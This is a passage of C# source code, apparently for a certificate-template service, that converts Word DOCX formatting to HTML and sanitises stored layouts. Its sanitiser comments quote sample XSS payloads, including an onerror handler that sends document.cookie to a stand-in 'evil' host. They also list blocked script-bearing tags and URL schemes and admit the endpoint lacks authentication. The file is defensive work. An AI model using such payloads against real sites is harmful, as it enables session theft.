            && !string.Equals(value, "auto", StringComparison.OrdinalIgnoreCase);

        /// <summary>
        /// Turns a w:top / w:left / w:bottom border element into a CSS border shorthand.
        /// w:val carries the line style and w:sz is in eighths of a point, so both the
        /// style and the width of the rule survive the round trip.
        /// </summary>
        private static string? BorderCss(XElement? border, string property)
        {
            if (border == null)
            {
                return null;
            }

            var style = border.Attribute(W + "val")?.Value ?? "single";
            if (string.Equals(style, "none", StringComparison.OrdinalIgnoreCase)
                || string.Equals(style, "nil", StringComparison.OrdinalIgnoreCase))
            {
                return property + ": none";
            }

            var eighths = ParseInt(border.Attribute(W + "sz")?.Value);
            if (eighths <= 0)
            {
                eighths = 4;
            }

            var width = (eighths / 8.0).ToString("0.##", CultureInfo.InvariantCulture);
            var colour = border.Attribute(W + "color")?.Value;
            var cssColour = IsRealColour(colour) ? "#" + colour!.TrimStart('#') : "#000";

            var cssStyle = style switch
            {
                "double" => "double",
                "dashed" => "dashed",
                "dashSmallGap" => "dashed",
                "dotted" => "dotted",
                "dotDash" => "dashed",
                _ => "solid"
            };

            return property + ": " + cssStyle + " " + width + "pt " + cssColour;
        }

        /// <summary>
        /// Rejoins a placeholder that Word split across runs. Formatting sits between the
        /// two halves, which would stop the token being recognised; the tags inside the
        /// braces are dropped along with the closing tags that balanced them, and only
        /// when they directly follow the token. Text and formatting outside the braces
        /// are left untouched.
        /// </summary>
        private static string StitchTokens(string html) =>
            Regex.Replace(
                html,
                @"(\{\{[^{}<>]*?)(?:\s*<[^<>]*>\s*)+([^{}<>]*?\}\})(?:\s*</[a-zA-Z][a-zA-Z0-9]*>\s*)+",
                "$1$2",
                RegexOptions.Singleline);

        /// <summary>Word highlight names mapped to the colours they print as.</summary>
        private static string? HighlightColour(string? name) => name?.Trim().ToLowerInvariant() switch
        {
            "black" => "#000000",
            "blue" => "#0000ff",
            "cyan" => "#00ffff",
            "green" => "#00ff00",
            "magenta" => "#ff00ff",
            "red" => "#ff0000",
            "yellow" => "#ffff00",
            "white" => "#ffffff",
            "darkblue" => "#000080",
            "darkcyan" => "#008080",
            "darkgreen" => "#008000",
            "darkmagenta" => "#800080",
            "darkred" => "#800000",
            "darkyellow" => "#808000",
            "darkgray" => "#808080",
            "lightgray" => "#c0c0c0",
            _ => null
        };

        private static string? MapAlignment(string? value)
        {
            return value?.Trim().ToLowerInvariant() switch
            {
                "left" or "start" => "left",
                "center" => "center",
                "right" or "end" => "right",
                "both" or "distribute" or "justify" => "justify",
                _ => null
            };
        }

        /// <summary>
        /// Word's "on" toggle properties are val="1"/"true"/"on", or a bare empty element.
        /// </summary>
        private static bool IsOn(XElement? element, string? expectedValue = null)
        {
            if (element == null)
            {
                return false;
            }

            var value = element.Attribute(W + "val")?.Value;

            if (expectedValue != null)
            {
                return string.Equals(value, expectedValue, StringComparison.OrdinalIgnoreCase);
            }

            if (value == null)
            {
                return true;
            }

            return value.Trim().ToLowerInvariant() is "1" or "true" or "on";
        }

        // ------------------------------------------------------------ Shared

        // The container is only the printable page frame (paper width, centred, serif).
        // Nothing is prepended to or imposed on the converted content: the caller's
        // paragraphs, tables, images, alignment and spacing are emitted as Word had them.
        private static TemplateImportResult Wrap(string body, string fileName, string sourceLabel)
        {
            var html =
                "<div class=\"certificate-container\" " +
                "style=\"font-family: 'Times New Roman', serif; padding: 40px; color: #000; " +
                "max-width: 800px; margin: auto; background: #fff;\">\n" +
                body.Trim('\n', ' ', '\t') +
                "\n</div>";

            return new TemplateImportResult
            {
                Success = true,
                Html = Normalize(html),
                Message = fileName.Length == 0
                    ? "Template imported."
                    : $"Converted \"{fileName}\" to HTML. Review the layout and placeholders, then save.",
                SourceLabel = sourceLabel
            };
        }

        /// <summary>
        /// Defence-in-depth pass run on every stored layout before it is saved.
        ///
        /// This is deliberately a targeted filter, not a general-purpose HTML sanitiser:
        /// it removes script-bearing and navigational constructs and neutralises
        /// javascript: URLs, while preserving the inline styling, data-URI logos and the
        /// single onerror="this.style.display='none';" no-op that certificate letterheads
        /// rely on. Every other inline event handler is stripped.
        ///
        /// Note this is defence-in-depth only. The application currently has no
        /// authentication, so this path is reachable by any anonymous caller who can
        /// obtain an antiforgery token, and template layouts are rendered with
        /// @Html.Raw / innerHTML. It does not by itself make stored layouts safe.
        /// </summary>
        public static string SanitizeForStorage(string? html)
        {
            if (string.IsNullOrWhiteSpace(html))
            {
                return string.Empty;
            }

            var value = html;

            foreach (var tag in new[]
            {
                "script", "iframe", "object", "embed", "link", "meta",
                "base", "form", "noscript", "applet", "frame", "frameset"
            })
            {
                value = RemoveElement(value, tag);
            }

            // Remove every inline event handler. The built-in letterhead templates rely
            // on onerror="this.style.display='none';" to hide a missing logo image, so
            // exactly that no-op is preserved; every other handler is stripped, because
            // deciding on the attribute name alone also preserved
            // onerror="fetch('//evil/'+document.cookie)".
            // The lookbehind matters too: requiring "\s+" before "on" meant
            // <img src="x"onerror="alert(1)"> was never matched at all, and HTML
            // parsers accept an attribute with no preceding whitespace.
            value = Regex.Replace(
                value,
                @"(?<=[\s""'/])on[a-z]+\s*=\s*(?:""[^""]*""|'[^']*'|[^\s>]+)",
                match => IsAllowedHandler(match.Value) ? match.Value : string.Empty,
                RegexOptions.IgnoreCase);

            value = Regex.Replace(
                value,
                @"\s(?:href|src)\s*=\s*(?:""[^""]*""|'[^']*'|[^\s>]+)",
                match => IsSafeUrlAttribute(match.Value) ? match.Value : string.Empty,
                RegexOptions.IgnoreCase);

            return value;
        }

        /// <summary>
        /// Decides whether a URL-bearing attribute may be kept. data: URIs are allowed for
        /// images only, because ReadMedia inlines imported .docx letterheads that way; a
        /// data:text/html payload is script-capable and is refused.
        /// </summary>
        private static bool IsSafeUrlAttribute(string attribute)
        {
            var url = Regex.Match(
                attribute,
                @"=\s*(?:""([^""]*)""|'([^']*)'|([^\s>]+))\s*$");

            if (!url.Success)
            {
                return true;
            }

            var value = url.Groups[1].Success ? url.Groups[1].Value
                : url.Groups[2].Success ? url.Groups[2].Value
                : url.Groups[3].Value;

            // Browsers ignore whitespace and control characters when resolving a scheme,
            // so "java\tscript:" has to be neutralised as well as "javascript:".
            var probe = Regex.Replace(value, @"[\s\x00-\x20]+", string.Empty).ToLowerInvariant();

            if (probe.StartsWith("javascript:") || probe.StartsWith("vbscript:"))
            {
                return false;
            }

            if (probe.StartsWith("data:"))
            {
                return probe.StartsWith("data:image/");
            }

            return true;
        }

        private static bool IsAllowedHandler(string attribute)
        {
            var match = Regex.Match(
                attribute,
                @"^\s*(on[a-z]+)\s*=\s*(.*)$",
                RegexOptions.IgnoreCase | RegexOptions.Singleline);

            if (!match.Success)
            {
                return false;
            }

            var name = match.Groups[1].Value.ToLowerInvariant();

            if (name is not ("onerror" or "onload"))
            {
                return false;
            }

            var raw = match.Groups[2].Value.Trim();

            if (raw.Length >= 2
                && ((raw[0] == '"' && raw[^1] == '"') || (raw[0] == '\'' && raw[^1] == '\'')))
            {
                raw = raw.Substring(1, raw.Length - 2);
            }

            var value = Regex.Replace(raw, @"\s+", string.Empty);

            // The single no-op the letterhead templates need, and nothing else.
            return string.Equals(value, "this.style.display='none';", StringComparison.OrdinalIgnoreCase)
                || string.Equals(value, "this.style.display='none'", StringComparison.OrdinalIgnoreCase)
                || string.Equals(value, "this.style.display=\"none\";", StringComparison.OrdinalIgnoreCase)
                || string.Equals(value, "this.style.display=\"none\"", StringComparison.OrdinalIgnoreCase);
        }

        /// <summary>
        /// Tidy up whitespace so the stored layout stays readable in the HTML editor
        /// and diffs cleanly between saves.
        /// </summary>
        public static string Normalize(string html)
        {
            var value = html.Replace("\r\n", "\n").Replace('\r', '\n');

            // Closes any tag written without its bracket ("</p"). Earlier builds of the
            // DOCX converter emitted those, and the malformed markup confuses anything
            // that later scans the text for tag boundaries.
            value = Regex.Replace(value, @"</(?<name>[a-zA-Z][a-zA-Z0-9]*)(?=[\r\n<]|$)", "</${name}>");

            value = Regex.Replace(value, @"[ \t]+\n", "\n");
            value = Regex.Replace(value, @"\n{3,}", "\n\n");

            // Collapse runs of spaces produced by Word between inline tags.
            value = Regex.Replace(value, @"[ \t]{2,}", " ");

            return value.Trim() + "\n";
        }

        /// <summary>
        /// Reduces a layout to its visible text so a caller can tell whether a template
        /// carries any printable content at all.
        /// </summary>
        public static string StripTags(string html) =>
            Regex.Replace(
                Regex.Replace(html, "<[^>]+>", " "),
                @"&[a-z]+;|&#\d+;",
                " ",
                RegexOptions.IgnoreCase)
                .Trim();
    }
}
